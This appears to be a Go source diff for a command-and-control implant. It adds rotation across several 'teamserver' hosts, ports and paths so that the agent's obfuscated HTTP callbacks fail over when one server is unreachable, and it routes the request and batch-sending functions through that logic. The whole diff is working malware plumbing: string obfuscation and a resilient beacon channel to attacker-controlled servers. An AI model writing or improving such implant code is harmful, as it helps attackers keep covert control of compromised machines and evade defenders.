@@ -108,8 +108,10 @@ func buildWirePayload(plain string) string {
 }
 
 func baseURL() string {
-	// Builds the base URL from the host port and path
-	p := general.ParsePortDigits(global.Port)
+	// Builds the base URL from the first entry of the teamserver lists
+	sep := obf.S(",")
+	pt := strings.Split(global.Port, sep)[0]
+	p := general.ParsePortDigits(pt)
 	if p == 0 {
 		return ""
 	}
@@ -117,7 +119,7 @@ func baseURL() string {
 	if global.Channel == obf.S("https") {
 		scheme = obf.S("https://")
 	}
-	return scheme + global.Host + obf.S(":") + global.Port + global.Path
+	return scheme + strings.Split(global.Host, sep)[0] + obf.S(":") + pt + strings.Split(global.Path, sep)[0]
 }
 
 func exchangeURL(url, payload string) HTTPResponse {
@@ -204,8 +206,21 @@ func exchangeURL(url, payload string) HTTPResponse {
 }
 
 func HTTPPost(body string) HTTPResponse {
-	// Sends a post request to the base URL
-	return exchangeURL(baseURL(), body)
+	// Sends a post request to the base URL, rotating team servers when one is unreachable
+	resp := exchangeURL(baseURL(), body)
+	if resp.OK {
+		return resp
+	}
+	sep := obf.S(",")
+	hs := strings.Split(global.Host, sep)
+	ps := strings.Split(global.Port, sep)
+	xs := strings.Split(global.Path, sep)
+	if len(hs) > 1 && len(ps) == len(hs) && len(xs) == len(hs) {
+		global.Host = strings.Join(append(hs[1:], hs[0]), sep)
+		global.Port = strings.Join(append(ps[1:], ps[0]), sep)
+		global.Path = strings.Join(append(xs[1:], xs[0]), sep)
+	}
+	return resp
 }
 
 func SendRequest(tag string) HTTPResponse {
@@ -218,7 +233,7 @@ func SendRequest(tag string) HTTPResponse {
 	if err != nil {
 		return HTTPResponse{}
 	}
-	return exchangeURL(baseURL(), string(payload))
+	return HTTPPost(string(payload))
 }
 
 func SendBatch(payload string) HTTPResponse {
@@ -236,9 +251,9 @@ func SendBatch(payload string) HTTPResponse {
 		if err != nil {
 			return HTTPResponse{}
 		}
-		return exchangeURL(baseURL(), string(wire))
+		return HTTPPost(string(wire))
 	}
-	return exchangeURL(baseURL(), payload)
+	return HTTPPost(payload)
 }
 
 func RelayCall(payload string) HTTPResponse {
